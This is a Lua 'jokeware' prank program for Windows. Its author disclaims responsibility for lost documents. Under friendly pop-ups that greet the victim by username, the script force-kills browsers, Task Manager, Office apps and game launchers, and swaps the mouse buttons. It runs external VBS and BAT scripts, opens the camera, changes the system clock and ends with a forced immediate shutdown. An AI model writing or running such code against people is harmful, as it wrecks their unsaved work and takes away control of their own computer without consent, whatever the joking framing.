-- This code is written by Matthew C.
-- Please use at your own risk.
-- I am not responsible for your unsaved documents, don't come crying to me about them.
-- There is a high likelyhood that your anti-virus will delete the file.
-- THIS IS NOT ACTUALLY MALICIOUS.  IT'S JOKEWARE.

local ui = require "ui"

local sys = require "sys"

local dir = print(sys.Directory(sys.currentdir))

local user = print(os.getenv('USERNAME'));

local audio = require "audio"

local json = require "json"

local today = sys.Datetime()

local hellomus = audio.Sound("mus//HELLO.mp3")  --HELLO

local liltrickmus = audio.Sound("mus//tomfoolery.mp3")  --Lil' Trick

local ufrmus = audio.Sound("mus//ufr.mp3")  --Unexpected Face Reveal

local iyhmus = audio.Sound("mus//iyh.mp3")  --In Your Head



--Functions

function DiscDrive()
  os.execute("extern//disc.vbs");
end

function Waiteroo(n)
  local t = os.clock()
  while os.clock() - t <= n do
    -- nothing
  end
end

function CloseDistractions()  --MIGRATED TO EXTERNAL .BAT (/extern/Distractions.bat)
  
  --Browsers

  os.execute("taskkill /F /IM \"chrome.exe\" /T");  --Chrome
  os.execute("taskkill /F /IM \"msedge.exe\" /T");  --Edge
  os.execute("taskkill /F /IM \"firefox.exe\" /T");  --FireFox
  os.execute("taskkill /F /IM \"Opera.exe\" /T");  --Opera

  --System Shtuffs

  os.execute("taskkill /F /IM \"taskmgr.exe\" /T");  --Task Manager

  --Game Launchers

  os.execute("taskkill /F /IM \"steam.exe\" /T");  --Steam
  os.execute("taskkill /F /IM \"EpicGamesLauncher.exe\" /T");  --EG Launcher

  --Stupid Stuff Because Funny

  os.execute("taskkill /F /IM \"calc.exe\" /T");  --Calculator (LMFAO)
  os.execute("taskkill /F /IM \"notepad.exe\" /T");  --Notepad

  --Office

  os.execute("taskkill /F /IM \"winword.exe\" /T");  --MS Word
  os.execute("taskkill /F /IM \"excel.exe\" /T");  --MS Excel
  os.execute("taskkill /F /IM \"powerpnt.exe\" /T");  --Powerpoint
end

function shutter()
  os.execute("shutdown /s /t 10 -c Hahaha!!");
end

--here comes the garbage lmao

ui.info("Hey dude!");

json.save("dateShutdown.json", today);

ui.info("Wait...");

ui.info("I think I know you!");

hellomus:play();
      
ui.info("Are you "..os.getenv('USERNAME').."?");

ui.info("It is you!");

ui.info("You're used to your mouse inputs, aren't ya?");

ui.info("It would be really funny if I messed with that...");

os.execute("RUNDLL32 USER32.DLL,SwapMouseButton");  --Swap Mouse Inputs

ui.info("Hey "..os.getenv('USERNAME')..", what are you looking at over there?");

ui.info("Don\'t worry, I\'ll deal with that for you!");

os.execute("extern\\Distractions.bat");

ui.info("Now that that\'s dealt with...");

ui.info("How\'s it going "..os.getenv('USERNAME').."?");

ui.info("Good?");

ui.info("That\'s great!");

ui.info("I wanted to show you a trick I\'ve been working on!!");

hellomus:stop()

liltrickmus:play()

DiscDrive();

ui.info("Ta-da!!");

ui.info("Cool, right?");

ui.info("Actually, I kinda forgot what you look like!");

ui.info("Let me juusssttt-");

liltrickmus:stop()

os.execute("start microsoft.windows.camera:");  --Open Windows Camera

ufrmus:play()

Waiteroo(1*03);

ui.info("There we go!");

ui.info("Now I remember!");

ui.info("Anyways,");

os.execute("time 10:42");
          
ui.info("I gotta go now");

os.execute("time 3:57");

ui.info("Actually...");

ui.info("Before I go...");          

os.execute("start https://www.youtube.com/watch?v=dQw4w9WgXcQ");  --RICK

ui.info("Hahaha!!");  

ufrmus:stop()

iyhmus:play()
                    
ui.warn("I\'M IN YOUR HEAD.");  

os.execute("extern\\noteSpeak.bat");  --Will type out "I SEE YOU" in notepad.  Creepy.

Waiteroo(1*05);

ui.warn("..."); 

iyhmus:stop()
          
ui.info("Bye "..os.getenv('USERNAME').."!!!");

json.save("trollingdocs\\dateShutdown.json", today)

os.execute("shutdown /s /t 00");
